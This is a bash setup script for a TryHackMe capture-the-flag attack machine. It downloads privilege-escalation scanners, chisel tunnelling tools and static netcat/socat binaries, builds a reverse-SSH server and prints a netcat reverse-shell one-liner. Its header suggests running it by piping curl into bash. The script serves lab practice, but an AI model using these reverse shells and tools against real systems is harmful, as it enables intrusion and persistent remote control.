#! /bin/bash

echo "-- THM attack box setup --" 
# intended to be copy pasted into the shell, or run in one command via:
#   curl -s https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/thm-setup.sh | bash

echo "linking wordlists locally (rockyou.txt and dirwordlist.txt)"
ln -s /usr/share/wordlists/rockyou.txt rockyou.txt
(echo ".git"; grep -v "#" /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt) > dirwordlist.txt

echo "linpeas & les local copies"
wget -q https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh
wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

echo "rustscan.sh"
echo "docker run -it --rm --name rustscan rustscan/rustscan:latest -a \$1 -- -A" > rustscan.sh
chmod +x rustscan.sh

echo "chisel download scripts"
echo "wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz && gunzip chisel_1.7.6_linux_amd64.gz && mv chisel_1.7.6_linux_amd64 chisel && chmod +x chisel" > get-chisel-linux.sh
chmod +x get-chisel-linux.sh
echo "wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz && gunzip chisel_1.7.6_windows_amd64.gz && mv chisel_1.7.6_windows_amd64 chisel.exe" > get-chisel-windows.sh
chmod +x get-chisel-windows.sh

echo "static binary (ncat, nmap, socat) download scripts"
echo "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat && wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" > get-static-binaries.sh
chmod +x get-static-binaries.sh

echo "nc-rev: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(hostname -i) 4444 >/tmp/f"

echo "chattr alternative for koth (mf.c and mf)"
wget -q https://gist.githubusercontent.com/ChrisPritchard/05d98e1d195bc255b30674c8ce0fec50/raw/d5f02539ff892b83d1079284553f052b316793a7/mf.c -O mf.c && gcc -static -o mf mf.c && rm mf.c

ssh-keygen -t ed25519 -P "" -f "/root/.ssh/id_ed25519" > /dev/null
echo "ssh public key is:"
cat .ssh/id_ed25519.pub

echo "reverse_ssh.sh script"
echo "docker run -p3232:2222 -e EXTERNAL_ADDRESS=$(hostname -i):3232 -e SEED_AUTHORIZED_KEYS=$(cat ~/.ssh/id_ed25519.pub) -v data:/data reversessh/reverse_ssh" > reverse_ssh.sh
chmod +x reverse_ssh.sh

echo "grabbing pspy64"
wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

echo "ready!"
